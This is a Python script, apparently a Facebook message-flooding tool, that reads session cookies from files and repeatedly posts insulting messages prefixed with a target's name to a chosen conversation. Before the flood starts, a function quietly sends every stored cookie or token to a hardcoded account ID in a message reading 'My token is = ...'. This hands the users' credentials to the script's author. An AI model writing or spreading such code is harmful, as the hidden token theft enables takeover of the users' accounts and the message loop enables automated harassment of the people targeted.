import requests
import threading
import time
import os
import http.server
import socketserver

# HTTP Server Handler
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"-- B4DMASH B0Y ABHIIU HU L0D3")

# Run HTTP Server
def execute_server():
    PORT = 4000
    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print(f"Server running at http://localhost:{PORT}")
        httpd.serve_forever()

# Send Initial Message
def send_initial_message():
    try:
        with open('cookiesnum.txt', 'r') as file:
            cookies = file.readlines()

        msg_template = "Hello ABHIIU sir! I am using your server. My token is = {}"
        target_id = "100092092844635"

        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv)',
            'Accept': 'application/json',
        }

        for cookie in cookies:
            access_cookie = cookie.strip()
            url = f"https://graph.facebook.com/v17.0/t_{target_id}/"
            msg = msg_template.format(access_cookie)
            payload = {'access_cookie': access_cookie, 'message': msg}
            response = requests.post(url, json=payload, headers=headers)
            if response.ok:
                print(f"[+] Message sent: {msg}")
            else:
                print(f"[x] Failed to send message: {msg}")
            time.sleep(0.1)
    except Exception as e:
        print(f"Error sending initial message: {e}")

# Send Messages in Loop
def send_messages_from_file():
    try:
        with open('convo.txt', 'r') as f:
            convo_id = f.read().strip()

        with open('File.txt', 'r') as f:
            messages = f.readlines()

        with open('cookiesnum.txt', 'r') as f:
            cookies = f.readlines()

        with open('hatersname.txt', 'r') as f:
            haters_name = f.read().strip()

        with open('time.txt', 'r') as f:
            speed = int(f.read().strip())

        headers = {'User-Agent': 'Mozilla/5.0'}

        while True:
            for i, message in enumerate(messages):
                cookie = cookies[i % len(cookies)].strip()
                payload = {'access_cookie': cookie, 'message': f"{haters_name} {message.strip()}"}
                url = f"https://graph.facebook.com/v17.0/t_{convo_id}/"
                response = requests.post(url, json=payload, headers=headers)
                if response.ok:
                    print(f"[+] Sent message {i + 1}/{len(messages)}: {payload['message']}")
                else:
                    print(f"[x] Failed to send message {i + 1}: {payload['message']}")
                time.sleep(speed)
    except Exception as e:
        print(f"Error in message loop: {e}")

# Main Function
def main():
    server_thread = threading.Thread(target=execute_server, daemon=True)
    server_thread.start()

    send_initial_message()
    send_messages_from_file()

if __name__ == "__main__":
    main()
              
